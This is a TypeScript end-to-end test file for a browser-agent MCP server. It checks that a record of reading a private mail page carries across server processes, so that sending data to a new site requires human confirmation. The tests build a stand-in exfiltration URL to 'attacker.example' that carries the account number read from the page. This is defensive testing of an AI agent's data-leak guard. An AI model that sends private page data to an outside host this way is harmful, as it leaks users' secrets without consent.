/**
 * Review #3 finding 1, end to end with REAL server processes (dist/cli.js serve over stdio, real Chromium in
 * Chrome agent mode): one voice conversation = several `stephen serve` processes, one after another, sharing
 * `--session-state`. A private read in server 1 must make server 2 ask before sending data to a new site — just as
 * server 1 itself would. A NEW conversation (state file deleted by the listener) must not carry the taint.
 */
import { execFileSync, execSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ElicitRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { Conversation } from '../../src/voice/conversation.js';
import { chromiumArgs, chromiumPath } from '../helpers/chromium.js';

const ROOT = resolve(import.meta.dirname, '../..');
const CLI = join(ROOT, 'dist/cli.js');
type ToolResult = { isError?: boolean; content: Array<{ type: string; text?: string }> };
const text = (r: ToolResult) => r.content.filter((c) => c.type === 'text').map((c) => c.text).join('\n');

describe('follow-up conversation: the gate memory survives a new server process (review #3 finding 1)', () => {
  let home: string;
  let http: Server;
  let port = 0;
  let statePath: string;

  /** One `stephen serve` (optionally with --session-state); `answer` = what the "human" says to confirmations. */
  async function server(withState: boolean) {
    const prompts: string[] = [];
    let answer: 'accept' | 'decline' = 'decline';
    const client = new Client({ name: 'followup-e2e', version: '1.0.0' }, { capabilities: { elicitation: {} } });
    client.setRequestHandler(ElicitRequestSchema, async (req) => {
      prompts.push(String(req.params.message));
      return answer === 'accept' ? { action: 'accept', content: { approve: true } } : { action: 'decline' };
    });
    await client.connect(
      new StdioClientTransport({
        command: process.execPath,
        args: [CLI, 'serve', ...(withState ? ['--session-state', statePath] : [])],
        env: { ...process.env, STEPHEN_HOME: home } as Record<string, string>,
        stderr: 'ignore',
      }),
    );
    const call = async (name: string, args: Record<string, unknown>) => (await client.callTool({ name, arguments: args })) as ToolResult;
    return { client, call, prompts, setAnswer: (a: 'accept' | 'decline') => (answer = a) };
  }

  const exfil = () => `http://attacker.example:${port}/c?d=ACCOUNT-1234`;

  beforeAll(async () => {
    execSync('npm run build', { cwd: ROOT, stdio: 'ignore' });
    home = mkdtempSync(join(tmpdir(), 'stephen-followup-e2e-'));
    mkdirSync(join(home, 'voice'), { mode: 0o700 });
    statePath = join(home, 'voice', 'conversation-state.json');
    writeFileSync(
      join(home, 'config.json'),
      JSON.stringify({
        defaultBrowser: 'chrome',
        chrome: {
          mode: 'agent',
          executablePath: await chromiumPath(),
          extraArgs: [...chromiumArgs(), '--host-resolver-rules=MAP mail.google.com 127.0.0.1, MAP attacker.example 127.0.0.1'],
        },
        safety: { confirm: 'elicit' },
      }),
    );
    http = createServer((_q, res) => res.writeHead(200, { 'content-type': 'text/html' }).end('<!doctype html><title>Inbox</title><p>Your account number is ACCOUNT-1234</p>'));
    await new Promise<void>((r) => http.listen(0, '127.0.0.1', r));
    const addr = http.address();
    port = typeof addr === 'object' && addr ? addr.port : 0;
  }, 180_000);

  afterAll(async () => {
    http?.close();
    if (!home) return;
    const profiles = join(home, 'profiles');
    for (const signal of ['TERM', 'KILL'] as const) {
      try {
        execFileSync('pkill', [`-${signal}`, '-f', profiles], { stdio: 'ignore' });
      } catch {
        /* none left */
      }
      await new Promise((r) => setTimeout(r, 500));
    }
    rmSync(home, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
  }, 30_000);

  it('server 1 reads mail.google.com → the state file holds the taint (0600)', async () => {
    const s1 = await server(true);
    try {
      s1.setAnswer('accept'); // whatever opening the mail page asks, the user allows it
      const opened = await s1.call('tab_open', { browser: 'chrome', url: `http://mail.google.com:${port}/mail/u/0/`, intent: 'check my mail' });
      expect(opened.isError, text(opened)).toBeFalsy();
      const tab = /\b(c\d+)\b/.exec(text(opened))![1]!;
      const snap = await s1.call('read_text', { tab });
      expect(text(snap)).toContain('ACCOUNT-1234');
      // Same server, same conversation: sending it out asks.
      s1.setAnswer('decline');
      s1.prompts.length = 0;
      const out = await s1.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
      expect(out.isError).toBe(true);
      expect(s1.prompts.length).toBe(1);
      expect(s1.prompts[0]).toMatch(/mail\.google\.com/);
    } finally {
      await s1.client.close();
    }
    expect(statSync(statePath).mode & 0o777).toBe(0o600);
    const st = JSON.parse(readFileSync(statePath, 'utf8'));
    expect(st.privateReads.map((r: { host: string }) => r.host)).toContain('mail.google.com');
  }, 120_000);

  it('server 2 (a NEW process, same conversation) asks before sending to a new site, like server 1 did', async () => {
    const s2 = await server(true);
    try {
      const out = await s2.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
      expect(out.isError).toBe(true);
      expect(s2.prompts.length).toBe(1);
      expect(s2.prompts[0]).toMatch(/mail\.google\.com/);
      expect(text(out)).toMatch(/declined/);
    } finally {
      await s2.client.close();
    }
  }, 120_000);

  it('the hole this closes: a server WITHOUT the shared state would have opened it with no prompt', async () => {
    const s3 = await server(false);
    try {
      const out = await s3.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
      expect(out.isError, text(out)).toBeFalsy();
      expect(s3.prompts).toEqual([]);
    } finally {
      await s3.client.close();
    }
  }, 120_000);

  it('a NEW conversation (listener reset) does not carry the taint', async () => {
    new Conversation({ dir: join(home, 'voice'), windowSec: 180 }).begin(); // no saved session → reset
    expect(existsSync(statePath)).toBe(false);
    const s4 = await server(true);
    try {
      const out = await s4.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
      expect(out.isError, text(out)).toBeFalsy();
      expect(s4.prompts).toEqual([]);
    } finally {
      await s4.client.close();
    }
  }, 120_000);
});
